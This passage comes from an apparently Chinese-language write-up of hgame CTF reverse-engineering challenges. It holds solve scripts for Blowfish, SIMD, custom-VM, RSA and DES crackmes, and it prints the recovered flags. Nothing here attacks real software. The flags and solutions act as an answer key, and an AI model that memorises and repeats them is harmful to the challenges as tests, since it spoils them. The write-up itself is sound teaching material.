BLOWFISH_ENCRYPT) { loc_xr = loc_xr ^ container-\u0026gt;p[PASSES]; loc_xl = loc_xl ^ container-\u0026gt;p[PASSES+1]; } else if(mode == BLOWFISH_DECRYPT) { loc_xr = loc_xr ^ container-\u0026gt;p[1]; loc_xl = loc_xl ^ container-\u0026gt;p[0]; } *xl = loc_xl; *xr = loc_xr; } blowfish_t* blowfish_initialize(unsigned char* key, uint32_t length) { blowfish_t* container = malloc(sizeof(blowfish_t)); unsigned int i, ii, j = 0; uint32_t tmp, tmp_l = 0, tmp_r = 0; if(length \u0026gt; BLOWFISH_MAX_KEY_BYTES) return (blowfish_t*) NULL; for(i = 0; i \u0026lt; PASSES+2; i++) { container-\u0026gt;p[i] = P[i]; } for(i = 0; i \u0026lt; SBOXES; i++) { for(ii = 0; ii \u0026lt; 256; ii++) { container-\u0026gt;s[i][ii] = S[i][ii]; } } for(i = 0; i \u0026lt; PASSES+2; i++) { tmp = 0; for(ii = 0; ii \u0026lt; 4; ii++) { tmp = (tmp \u0026lt;\u0026lt; 8) | key[j]; j++; if(j == length) j = 0; } container-\u0026gt;p[i] = container-\u0026gt;p[i] ^ tmp; } for(i = 0; i \u0026lt; PASSES+1; i += 2) { blowfish_cipher(container, \u0026amp;tmp_l, \u0026amp;tmp_r, BLOWFISH_ENCRYPT); container-\u0026gt;p[i] = tmp_l; container-\u0026gt;p[i+1] = tmp_r; } for(i = 0; i \u0026lt; SBOXES; i++) { for(ii = 0; ii \u0026lt; 256; ii += 2) { blowfish_cipher(container, \u0026amp;tmp_l, \u0026amp;tmp_r, BLOWFISH_ENCRYPT); container-\u0026gt;s[i][ii] = tmp_l; container-\u0026gt;s[i][ii+1] = tmp_r; } } } int main(int argc, char** argv) { uint32_t high, low; blowfish_t* container = blowfish_initialize(\u0026#34;LET_U_D\u0026#34;, 7); high = 1416580799u; low = 3035468667u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); // write(1, \u0026amp;high, 8);  write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); high = 2194841726u; low = 332656605u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); // write(1, \u0026amp;high, 8);  write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); high = 571059727u; low = 1498341217u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); // write(1, \u0026amp;high, 8);  write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); high = 3107158060u; low = 470279474u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); // write(1, \u0026amp;high, 8);  write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); return 0; } blowfish.h 去仓库找就行\n 试了一下 pycrypto 库，解出来的有问题，可能库的实现和这个有区别，没深入研究\n week4 [RE]hardasm 全是 simd，反着执行回去就行，或者可以试试正着用 z3 解\n这个脚本因为有些指令的某一个参数是不变的（比如 vpermd ymmX, ymm7, ymmX），所以偷懒了\nasm = \u0026#39;\u0026#39;\u0026#39;\\ vpermd ymm4, ymm7, ymm4 ... vpermd ymm1, ymm7, ymm1\u0026#39;\u0026#39;\u0026#39; ymm0 = b\u0026#39;\\x93\\xcb\\xe7\\x93\\xa9\\x81\\r\\xb6\\xd8\\xdd\\x9c\\x7f\\xc0M\\xcd\\xf0\\x00\\xa0\\x9f\u0026#34;\\x89\\xefT]\\xef\\x00\\x8d\\xfe^L\\xd0\\xec\u0026#39; ymm1 = b\u0026#39;i\\xcf\\x8e\\xb3\\xf8\\x98\\x90\\x0b\\\\\u0026amp;}\\xcf\\x8c$\\x1d\\x96s\\x8b\\xc7\\xaa\\xfc\\xaf\\xfd\\x91F3e\\xb8#z\\xcd\\xa5\u0026#39; ymm2 = b\u0026#34;\\xff\\x83\\xf3\\xdf\\xec\\x00\\x8e\\x92OL\\x97O\u0026#39;D\\x7f\\xa4\\xe3N\\xbf$d\\xdd*T\\xc3i\\xb2\\x82q\\xa0\\x1b\\xf5\u0026#34; ymm3 = b\u0026#39;\\xb4\\xc7lj\\xfb\\x1fp\\xf5}\\xc9\\r\\x1b\\xb4\\xe5\\xffEN^\\x95]\\xef\\x8e@\\x8d\\x9a\\xf9\\xd1\\x92\\x8b\\xbf}\\xbb\u0026#39; ymm4 = b\u0026#39;\\xca}6\\xf7\\xc5\\xcb\\x90\\xb9B\\x96\\xe0\\xa55sL\\xf7\\xa9\\x9d\\x87\\xa1\\xc2r\\x8b\\xe8\\x9af\\t*\\xe6%\\x04\\xd1\u0026#39; ymm5 = b\u0026#39;)\\x9d\\x0bGy\\x1a\\xa4\\x97\\x02\\xbf\\x13\\x9e\\xa0\\xd2\\xa4m?_=M4\\xea\\xeeRa\\x97e\\xb4\\x04\\x91\\xd8W\u0026#39; ymm6 = b\u0026#39;\\x00\\x01\\x08\\t\\n\\x02\\x03\\x04\\x05\\x0c\\r\\x0e\\x06\\x07\\x0b\\x0f\\x00\\x06\\x07\\x08\\t\\n\\x02\\x03\\x04\\x05\\r\\x0e\\x0b\\x0c\\x01\\x0f\u0026#39; ymm7 = b\u0026#39;\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x07\\x00\\x00\\x00\u0026#39; def rev_vpermd(x, y): \u0026#34;\u0026#34;\u0026#34; origin: from: b\u0026#34;3_bh\u0026#34; b\u0026#34;\\rd\\xa8\\xff\\x8f\\x99\\xa7\\x94\\x9e\\x9a)4\u0026#34; b\u0026#34;\u0026#39;6\\xd6\\x82\\xc2m\\xe8\\xaa\u0026#34; b\u0026#34;\\x96Je\\xc0\\x0c7\\x19\\xc9\u0026#34; to : b\u0026#34;3_bh\u0026#34; b\u0026#34;\u0026#39;6\\xd6\\x82\\xc2m\\xe8\\xaa\u0026#34; b\u0026#34;\\rd\\xa8\\xff\\x8f\\x99\\xa7\\x94\\x9e\\x9a)4\u0026#34; b\u0026#34;\\x96Je\\xc0\\x0c7\\x19\\xc9\u0026#34; \u0026#34;\u0026#34;\u0026#34; return y[:4] + y[12:24] + y[4:12] + y[24:] def rev_vpxor(x, y): return bytes([a ^ b for a, b in zip(x, y)]) def rev_vpaddb(x, y): return bytes([(a - b) \u0026amp; 0xff for a, b in zip(x, y)]) def rev_vpsubb(x, y): return bytes([(a + b) \u0026amp; 0xff for a, b in zip(x, y)]) def rev_vpshufb(x, y): \u0026#34;\u0026#34;\u0026#34; origin: from: b\u0026#39;\\x89\\xa1\u0026#39; b\u0026#39;\u0026gt;\\xc0\\xe5\\x14\u0026#39; \u0026#39;_\\xc5\u0026#39; \u0026#39;_\\x14\\xb0\u0026#39; \u0026#39;\\xd0\u0026#39; \u0026#39;%\\x1f\\xe8\u0026#39; \u0026#39;\\xf5\\xb0\u0026#39; \u0026#39;4\u0026#39; \u0026#39;6\\xc2\\xc7\\xa0\u0026#39; \u0026#39;\\xb2\u0026lt;^~\\x9c\u0026#39; \u0026#39;\\xa4\\x98\u0026#39; \u0026#39;\\xe8T\u0026#39; \u0026#39;\\x0b\u0026#39; to : b\u0026#39;\\x89\\xa1\u0026#39; b\u0026#39;_\\x14\\xb0\u0026#39; \u0026#39;\u0026gt;\\xc0\\xe5\\x14\u0026#39; \u0026#39;%\\x1f\\xe8\u0026#39; \u0026#39;_\\xc5\u0026#39; \u0026#39;\\xd0\u0026#39; \u0026#39;\\xf5\\xb0\u0026#39; \u0026#39;\\xb2\u0026lt;^~\\x9c\u0026#39; \u0026#39;6\\xc2\\xc7\\xa0\u0026#39; \u0026#39;\\xe8T\u0026#39; \u0026#39;\\xa4\\x98\u0026#39; \u0026#39;4\u0026#39; \u0026#39;\\x0b\u0026#39; \u0026#34;\u0026#34;\u0026#34; return x[:2] + x[5:9] + x[12:14] + x[2:5] + x[14:15] + x[9:12] + x[15:17]+ x[30:31] + x[22:26] + x[17:22] + x[28:30] + x[26:28] + x[31:] for a in asm.split(\u0026#39;\\n\u0026#39;)[::-1]: b = a.replace(\u0026#39;,\u0026#39;, \u0026#39;\u0026#39;).split() exec(f\u0026#39;{b[1]}= rev_{b[0]}({b[2]}, {b[3]})\u0026#39;) print (ymm0)  ida 动调的时候要知道寄存器的值，可以用 idapython 的 get_reg_value(\u0026quot;ymm0\u0026quot;) 指令不知道什么意思的话动调看一下变化就行\n [RE]ezvm 把几个指令整理一下\n能够看出特定用途的几个寄存器：\n[8]: ZF 相等为 0，大于为 1，小于为 -1 [9]: stack [9 + 100]: code [9 + 200]: data\n其他的应该都是 rax 之类的\n总结的几个指令：\n   op disasm     0 mov r3, r2   1 inc r2   2 dec r2   3 xor r3, r7   4 push r3   5 push r5   6 push r6   7 pop r3   8 pop r5   9 pop r6   10 pop r2   11 pop r7   12 jz $+1+r6   13 jnz $+1+r6   14 jmp $+1+r2   15 cmp r3, r5   16 getchar(r3)   17 putchar(r3)   18 push *((r4++)+0xD1)   19 mov r3, [rbp+r2]   20 mov [rbp+r2], r3   21 add r3, r3    接下来就是反汇编了\ncode = [ 0x12, 8, 0x12, 9, 0x10, 4, 1, 0x0F, 0x0D, 2, 0x12, 8, 0x12, 9, 0, 4, 0x0F, 0x0D, 0x12, 9, 0x12, 0x0A, 0x13, 0x12, 0x0B, 0x15, 3, 0x14, 1, 0, 0x0F, 0x0D, 0x12, 0x0A, 0x12, 0x12, 0x12, 8, 0x13, 0x0F, 7, 4, 9, 0x0D, 9, 8, 5, 6, 4, 1, 0, 0x0F, 0x0D, 0x12, 9, 0x12, 8, 0x12, 0x0A, 0x12, 7, 0x0F, 0x0C, 0x11, 0x0E ] def disasm(i, c): if c == 0: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;mov [3], [2]\u0026#34;) elif c == 1: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;inc [2]\u0026#34;) elif c == 2: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;dec [2]\u0026#34;) elif c == 3: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;xor [3], [7]\u0026#34;) elif c == 4: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push [3]\u0026#34;) elif c == 5: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push [5]\u0026#34;) elif c == 6: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push [6]\u0026#34;) elif c == 7: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [3]\u0026#34;) elif c == 8: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [5]\u0026#34;) elif c == 9: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [6]\u0026#34;) elif c == 10: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [2]\u0026#34;) elif c == 11: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;pop [7]\u0026#34;) elif c == 12: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;jz $+1+[6]\u0026#34;) elif c == 13: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;jnz $+1+[6]\u0026#34;) elif c == 14: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;jmp $+1+[2]\u0026#34;) elif c == 15: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;cmp [3], [5]\u0026#34;) elif c == 16: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;getchar([3])\u0026#34;) elif c == 17: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;putchar([3])\u0026#34;) elif c == 18: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;push *(([4]++)+0xD1)\u0026#34;) elif c == 19: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;mov [3], [rbp+[2]]\u0026#34;) elif c == 20: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;mov [rbp+[2]], [3]\u0026#34;) elif c == 21: print (\u0026#34;_%02X:\\t\u0026#34; % i + \u0026#34;add [3], [3]\u0026#34;) 也许跟着 log 一起看比较好，这里就直接对着 data 里的数据看了\n_00: push 0x0A\r_01: pop [5]\r_02: push -5\r_03: pop [6]\r_04: getchar([3])\r_05: push [3]\r_06: inc [2]\r_07: cmp [3], [5]\r_08: jnz $+1+[6]\r_09: dec [2]\r这个 jnz 的循环是 getchar() 直到读取到 \\n\n接下来是个对长度做了限制\n_0A: push 0x20\r_0B: pop [5]\r_0C: push 0x2F\r_0D: pop [6]\r_0E: mov [3], [2]\r_0F: push [3]\r_10: cmp [3], [5]\r_11: jnz $+1+[6]\r这里先 add 自身，然后依次异或 data 中的数据（第一个是 0x5e）\n_12: push -10\r_13: pop [6]\r_14: push 0\r_15: pop [2]\r_16: mov [3], [rbp+[2]]\r_17: push 0x5e (next_mem)\r_18: pop [7]\r_19: add [3], [3]\r_1A: xor [3], [7]\r_1B: mov [rbp+[2]], [3]\r_1C: inc [2]\r_1D: mov [3], [2]\r_1E: cmp [3], [5]\r_1F: jnz $+1+[6]\r后面就是比较了，如果不相等就会直接从第一个 jnz 直接退出，否则会判断长度来看是否退出循环\n_20: push *(([4]++)+0xD1) ; 0\r_21: pop [2]\r_22: push *(([4]++)+0xD1) ; -17\r_23: push *(([4]++)+0xD1) ; 21\r_24: push *(([4]++)+0xD1) ; 142\r_25: pop [5] ; [5] = 142\r_26: mov [3], [rbp+[2]] ; [3]=142\r_27: cmp [3], [5] ; 0\r_28: pop [3]\r_29: push [3]\r_2A: pop [6] ; 21\r_2B: jnz $+1+[6]\r_2C: pop [6] ; -17\r_2D: pop [5]\r_2E: push [5]\r_2F: push [6]\r_30: push [3]\r_31: inc [2]\r_32: mov [3], [2]\r_33: cmp [3], [5]\r_34: jnz $+1+[6]\r最后一段没有看了，putchar() 显然是输出正确信息\n脚本\nfrom operator import xor xor_list = [0x5E, 0x46, 0x61, 0x43, 0x0E, 0x53, 0x49, 0x1F, 0x51, 0x5E, 0x36, 0x37, 0x29, 0x41, 0x63, 0x3B, 0x64, 0x3B, 0x15, 0x18, 0x5B, 0x3E, 0x22, 0x50, 0x46, 0x5E, 0x35, 0x4E, 0x43, 0x23, 0x60, 0x3B] cipher = [0x8E, 0x88, 0x0A3, 0x99, 0x0C4, 0x0A5, 0x0C3, 0x0DD, 0x19, 0x0EC, 0x6C, 0x9B, 0x0F3, 0x1B, 0x8B, 0x5B, 0x3E, 0x9B, 0x0F1, 0x86, 0x0F3, 0x0F4, 0x0A4, 0x0F8, 0x0F8, 0x98, 0x0AB, 0x86, 0x89, 0x61, 0x22, 0xC1] for x, c in zip(xor_list, cipher): print (chr((c ^ x) // 2), end=\u0026#39;\u0026#39;) # hgame{Ea$Y-Vm-t0-PrOTeCT_cOde!!} [RE]server 下断点，浏览器输入 localhost:9090?flag=hgame{} 就能断住，然后就是慢慢调试了\nrsa 部分用的 math/big 库中的东西，还是比较容易识别的（go 还是看汇编舒服）\n随后就是两个循环的异或了，这里用 z3 解的，所以逻辑直接看代码就行\nfrom libnum import * from z3 import * flag = [BitVec(\u0026#39;f%i\u0026#39; % i, 8) for i in range(153)] s = Solver() c = 0x66 flag2 = [] for i in range(153): v16 = flag[i] flag2.append(v16 ^ c) c = v16 for i in range(153): v18 = flag2[i] flag2[i] = v18 ^ c c = v18 cipher = [ 99, 85, 4, 3, 5, 5, 5, 3, 7, 7, 2, 8, 8, 11, 1, 2, 10, 4, 2, 13, 8, 9, 12, 9, 4, 13, 8, 0, 14, 0, 15, 13, 14, 10, 2, 2, 1, 7, 3, 5, 6, 4, 6, 7, 6, 2, 2, 5, 3, 3, 9, 6, 0, 11, 13, 11, 0, 2, 3, 8, 3, 11, 7, 1, 11, 5, 14, 5, 0, 10, 14, 15, 13, 7, 13, 7, 14, 1, 15, 1, 11, 5, 6, 2, 12, 6, 10, 4, 1, 7, 4, 2, 6, 3, 6, 12, 5, 12, 3, 12, 6, 0, 4, 15, 2, 14, 7, 0, 14, 14, 12, 4, 3, 4, 2, 0, 0, 2, 6, 2, 3, 6, 4, 4, 4, 7, 1, 2, 3, 9, 2, 12, 8, 1, 12, 3, 12, 2, 0, 3, 14, 3, 14, 12, 9, 1, 7, 15, 5, 7, 2, 2, 4 ] for i in range(153): s.add(flag2[i] == cipher[i]) for i in range(153): s.add(flag[i] \u0026gt;= ord(\u0026#39;0\u0026#39;)) s.add(flag[i] \u0026lt;= ord(\u0026#39;9\u0026#39;)) s.check() m = s.model() for i in flag: print (chr(m[i].as_long()), end=\u0026#39;\u0026#39;) # 135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024 M = 92582184765240663364795767694262273105045150785272129481762171937885924776597 N = 107310528658039985708896636559112400334262005367649176746429531274300859498993 t = M * N e = 950501 phi = (M - 1) * (N - 1) n2s(pow(135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024, invmod(e, phi), t)) # b\u0026#39;hgame{g0_and_g0_http_5erv3r_nb}\u0026#39; [RE]WOW 这题几乎和天堂之门没关系，主要是把密钥隐藏了，运算之后应该是 12345678，但也可以直接用 windbg 动调拿到轮密钥\n通过置换函数+明显的常数特征判断是 DES，直接解密就行\n网上抄了份 DES，改一改就行\nsolve.c\n#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026#34;bool.h\u0026#34;#include \u0026#34;tables.h\u0026#34; void BitsCopy(bool *DatOut,bool *DatIn,int Len); void ByteToBit(bool *DatOut,char *DatIn,int Num); void BitToByte(char *DatOut,bool *DatIn,int Num); void BitToHex(char *DatOut,bool *DatIn,int Num); void HexToBit(bool *DatOut,char *DatIn,int Num); void TablePermute(bool *DatOut,bool *DatIn,const char *Table,int Num); void LoopMove(bool *DatIn,int Len,int Num); void Xor(bool *DatA,bool *DatB,int Num); void S_Change(bool DatOut[32],bool DatIn[48]); void F_Change(bool DatIn[32],bool DatKi[48]); void SetKey(char KeyIn[8]); void PlayDes(char MesOut[8],char MesIn[8]); void KickDes(char MesOut[8],char MesIn[8]); int main() { char MesHex[64]={\u0026#34;92028926CF6497655A09A46F3A079DB14320B10556683353BB5AF969BBB23EA2\u0026#34;}; // 16个字符数组用于存放 64位16进制的密文  char MyMessage[32]={0}; KickDes(MyMessage,MesHex); KickDes(MyMessage+8,MesHex+16); KickDes(MyMessage+16,MesHex+32); KickDes(MyMessage+24,MesHex+48); printf(\u0026#34;Deciphering Over !!:\\n\u0026#34;); for(int i = 0; i \u0026lt; 32; i++) { printf(\u0026#34;%c\u0026#34;, MyMessage[i]); } printf(\u0026#34;\\n\u0026#34;); system(\u0026#34;pause\u0026#34;); } void BitsCopy(bool *DatOut,bool *DatIn,int Len) { for(int i=0; i \u0026lt; Len; i++) { DatOut[i] = DatIn[i]; } } void ByteToBit(bool *DatOut,char *DatIn,int Num) { for(int i = 0; i \u0026lt; Num; i++) { DatOut[i] = (DatIn[i / 8] \u0026gt;\u0026gt; (i % 8)) \u0026amp; 0x01; } } void BitToByte(char *DatOut,bool *DatIn,int Num) { for(int i = 0; i \u0026lt; (Num / 8); i++) { DatOut[i] = 0; } for(int i = 0; i \u0026lt; Num; i++) { DatOut[i / 8] |= DatIn[i] \u0026lt;\u0026lt; (i % 8); } } void BitToHex(char *DatOut,bool *DatIn,int Num) { int i; for(i = 0; i \u0026lt; Num / 4; i++) { DatOut[i] = 0; } for(i = 0; i \u0026lt; Num / 4; i++) { DatOut[i] = DatIn[i * 4] + (DatIn[i * 4 + 1] \u0026lt;\u0026lt; 1) + (DatIn[i * 4 + 2] \u0026lt;\u0026lt; 2) + (DatIn[i * 4 + 3] \u0026lt;\u0026lt; 3); if((DatOut[i] % 16) \u0026gt; 9) { DatOut[i] = DatOut[i] % 16 + \u0026#39;7\u0026#39;; } else { DatOut[i] = DatOut[i] % 16 + \u0026#39;0\u0026#39;; } } } void HexToBit(bool *DatOut,char *DatIn,int Num) { for(int i = 0; i \u0026lt; Num; i++) { if((DatIn[i / 4]) \u0026gt; \u0026#39;9\u0026#39;) { DatOut[i] = ((DatIn[i / 4] - \u0026#39;7\u0026#39;) \u0026gt;\u0026gt; (i % 4)) \u0026amp; 0x01; } else { DatOut[i] = ((DatIn[i / 4] - \u0026#39;0\u0026#39;) \u0026gt;\u0026gt; (i % 4)) \u0026amp; 0x01; } } } void TablePermute(bool *DatOut,bool *DatIn,const char *Table,int Num) { static bool Temp[256] = {0}; for(int i = 0; i \u0026lt; Num; i++) { Temp[i] = DatIn[Table[i] - 1]; } BitsCopy(DatOut, Temp, Num); } void LoopMove(bool *DatIn,int Len,int Num) { static bool Temp[256]={0}; BitsCopy(Temp,DatIn,Num); BitsCopy(DatIn,DatIn+Num,Len-Num); BitsCopy(DatIn+Len-Num,Temp,Num); } void Xor(bool *DatA,bool *DatB,int Num) { for(int i = 0; i \u0026lt; Num; i++) { DatA[i] = DatA[i] ^ DatB[i]; } } void S_Change(bool DatOut[32],bool DatIn[48]) { int i,X,Y; for(i = 0, Y = 0, X = 0; i \u0026lt; 8; i++, DatIn += 6, DatOut += 4) { Y=(DatIn[0] \u0026lt;\u0026lt; 1) + DatIn[5]; X=(DatIn[1] \u0026lt;\u0026lt; 3) + (DatIn[2] \u0026lt;\u0026lt; 2) + (DatIn[3] \u0026lt;\u0026lt; 1) + DatIn[4]; int v9 = S_Box[i][Y][X]; for(int j = 3; j \u0026gt;= 0; j--) { DatOut[j] = v9 % 2; v9 /= 2; } } } void F_Change(bool DatIn[32],bool DatKi[48]) { static bool MiR[48]={0}; TablePermute(MiR,DatIn,E_Table,48); Xor(MiR,DatKi,48); S_Change(DatIn,MiR); TablePermute(DatIn,DatIn,P_Table,32); } void SetKey(char KeyIn[8]) { static bool KeyBit[64] = {0}; static bool *KiL = \u0026amp;KeyBit[0], *KiR = \u0026amp;KeyBit[28]; ByteToBit(KeyBit, KeyIn, 64); TablePermute(KeyBit, KeyBit, PC1_Table, 56); for(int i = 0; i \u0026lt; 16; i++) { LoopMove(KiL, 28, Move_Table[i]); LoopMove(KiR, 28, Move_Table[i]); TablePermute(SubKey[i], KeyBit, PC2_Table, 48); } } void PlayDes(char MesOut[8],char MesIn[8]) { int i; static bool MesBit[64] = {0}; static bool Temp[32] = {0}; static bool *MiL = \u0026amp;MesBit[0], *MiR = \u0026amp;MesBit[32]; ByteToBit(MesBit, MesIn, 64); TablePermute(MesBit, MesBit, IP_Table, 64); for (i = 0; i \u0026lt; 64; i++) { printf(\u0026#34;%d \u0026#34;, MesBit[i]); } printf(\u0026#34;\\n\u0026#34;); for(i = 0; i \u0026lt; 16; i++) { BitsCopy(Temp, MiR, 32); F_Change(MiR, SubKey[i]); Xor(MiR, MiL, 32); BitsCopy(MiL, Temp, 32); for (int j = 0; j \u0026lt; 64; j++){ printf(\u0026#34;%d \u0026#34;, MesBit[j]); } printf(\u0026#34;\\n\u0026#34;); } for(i = 0; i \u0026lt; 32; i++) { int tmp = MesBit[i]; MesBit[i] = MesBit[i + 32]; MesBit[i + 32] = tmp; } TablePermute(MesBit, MesBit, IPR_Table, 64); for (i = 0; i \u0026lt; 64; i++){ printf(\u0026#34;%d \u0026#34;, MesBit[i]); } BitToHex(MesOut,MesBit,64); } void KickDes(char MesOut[8],char MesIn[8]) { int i; static bool MesBit[64] = {0}; static bool Temp[32] = {0}; static bool *MiL = \u0026amp;MesBit[0], *MiR = \u0026amp;MesBit[32]; HexToBit(MesBit, MesIn, 64); TablePermute(MesBit, MesBit, IP_Table, 64); for (i = 0; i \u0026lt; 32; i++) { int tmp = MesBit[i]; MesBit[i] = MesBit[i + 32]; MesBit[i + 32] = tmp; } for(i = 15; i \u0026gt;= 0; i--) { BitsCopy(Temp, MiL, 32); F_Change(MiL, SubKey[i]); Xor(MiL, MiR, 32); BitsCopy(MiR, Temp, 32); } TablePermute(MesBit, MesBit, IPR_Table, 64); for (i = 0; i \u0026lt; 64; i++){ printf(\u0026#34;%d \u0026#34;, MesBit[i]); } BitToByte(MesOut, MesBit, 64); } bool.h，我的评价是不如直接上 c++\n#ifndef __BOOL_H__ #define __BOOL_H__  typedef enum { false = 0, true = 1 } bool; #endif tables.h，之前找到的文件有几处与题目中不同，不知道是作者写错了还是题目改数了，直接把算好的 subkey 填到这里，就不用再输入密钥算了\n#ifndef _TABLES_H_ #define _TABLES_H_  const char IP_Table[64]={ 58,50,42,34,26,18,10, 2,60,52,44,36,28,20,12, 4, 62,54,46,38,30,22,14, 6,64,56,48,40,32,24,16, 8, 57,49,41,33,25,17, 9, 1,59,51,43,35,27,19,11, 3, 61,53,45,37,29,21,13, 5,63,55,47,39,31,23,15, 7 }; const char IPR_Table[64]={ 40, 8,48,16,56,24,64,32,39, 7,47,15,55,23,63,31, 38, 6,46,14,54,22,62,30,37, 5,45,13,53,21,61,29, 36, 4,44,12,52,20,60,28,35, 3,43,11,51,19,59,27, 34, 2,42,10,50,18,58,26,33, 1,41, 9,49,17,57,25\t}; static char E_Table[48]={ 32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9,10,11,12,13,12,13,14,15,16,17, 16,17,18,19,20,21,20,21,22,23,24,25, 24,25,26,27,28,29,28,29,30,31,32, 1 }; static char PC1_Table[56]={ 57,49,41,33,25,17, 9, 1,58,50,42,34,26,18, 10, 2,59,51,43,35,27,19,11, 3,60,52,44,36, 63,55,47,39,31,23,15, 7,62,54,46,38,30,22, 14, 6,61,53,45,37,29,21,13, 5,28,20,12, 4 }; static char Move_Table[16]={ 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 }; static char PC2_Table[48]={ 14,17,11,24, 1, 5, 3,28,15, 6,21,10, 23,19,12, 4,26, 8,16, 7,27,20,13, 2, 41,52,31,37,47,55,30,40,51,45,33,48, 44,49,39,56,34,53,46,42,50,36,29,32\t}; static char S_Box[8][4][16]={ //S1 \t14, 4,13, 1, 2,15,11, 8, 3,10, 6,12, 5, 9, 0, 7, 0,15, 7, 4,14, 2,13, 1,10, 6,12,11, 9, 5, 3, 8, 4, 1,14, 8,13, 6, 2,11,15,12, 9, 7, 3,10, 5, 0, 15,12, 8, 2, 4, 9, 1, 7, 5,11, 3,14,10, 0, 6,13, //S2 \t15, 1, 8,14, 6,11, 3, 4, 9, 7, 2,13,12, 0, 5,10, 3,13, 4, 7,15, 2, 8,14,12, 0, 1,10, 6, 9,11, 5, 0,14, 7,11,10, 4,13, 1, 5, 8,12, 6, 9, 3, 2,15, 13, 8,10, 1, 3,15, 4, 2,11, 6, 7,12, 0, 5,14, 9, //S3 \t10, 0, 9,14, 6, 3,15, 5, 1,13,12, 7,11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6,10, 2, 8, 5,14,12,11,15, 1, 13, 6, 4, 9, 8,15, 3, 0,11, 1, 2,12, 5,10,14, 7, 1,10,13, 0, 6, 9, 8, 7, 4,15,14, 3,11, 5, 2,12, //S4 \t7,13,14, 3, 0, 6, 9,10, 1, 2, 8, 5,11,12, 4,15, 13, 8,11, 5, 6,15, 0, 3, 4, 7, 2,12, 1,10,14, 9, 10, 6, 9, 0,12,11, 7,13,15, 1, 3,14, 5, 2, 8, 4, 3,15, 0, 6,10, 1,13, 8, 9, 4, 5,11,12, 7, 2,14, //S5 \t2,12, 4, 1, 7,10,11, 6, 8, 5, 3,15,13, 0,14, 9, 14,11, 2,12, 4, 7,13, 1, 5, 0,15,10, 3, 9, 8, 6, 4, 2, 1,11,10,13, 7, 8,15, 9,12, 5, 6, 3, 0,14, 11, 8,12, 7, 1,14, 2,13, 6,15, 0, 9,10, 4, 5, 3, //S6 \t12, 1,10,15, 9, 2, 6, 8, 0,13, 3, 4,14, 7, 5,11, 10,15, 4, 2, 7,12, 9, 5, 6, 1,13,14, 0,11, 3, 8, 9,14,15, 5, 2, 8,12, 3, 7, 0, 4,10, 1,13,11, 6, 4, 3, 2,12, 9, 5,15,10,11,14, 1, 7, 6, 0, 8,13, //S7 \t4,11, 2,14,15, 0, 8,13, 3,12, 9, 7, 5,10, 6, 1, 13, 0,11, 7, 4, 9, 1,10,14, 3, 5,12, 2,15, 8, 6, 1, 4,11,13,12, 3, 7,14,10,15, 6, 8, 0, 5, 9, 2, 6,11,13, 8, 1, 4,10, 7, 9, 5, 0,15,14, 2, 3,12, //S8 \t13, 2, 8, 4, 6,15,11, 1,10, 9, 3,14, 5, 0,12, 7, 1,15,13, 8,10, 3, 7, 4,12, 5, 6,11, 0,14, 9, 2, 7,11, 4, 1, 9,12,14, 2, 0, 6,10,13,15, 3, 5, 8, 2, 1,14, 7, 4,10, 8,13,15,12, 9, 0, 3, 5, 6,11 }; static char P_Table[32]={ 16, 7,20,21,29,12,28,17, 1,15,23,26, 5,18,31,10, 2, 8,24,14,32,27, 3, 9,19,13,30, 6,22,11, 4,25 }; static bool SubKey[16][48]={ 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 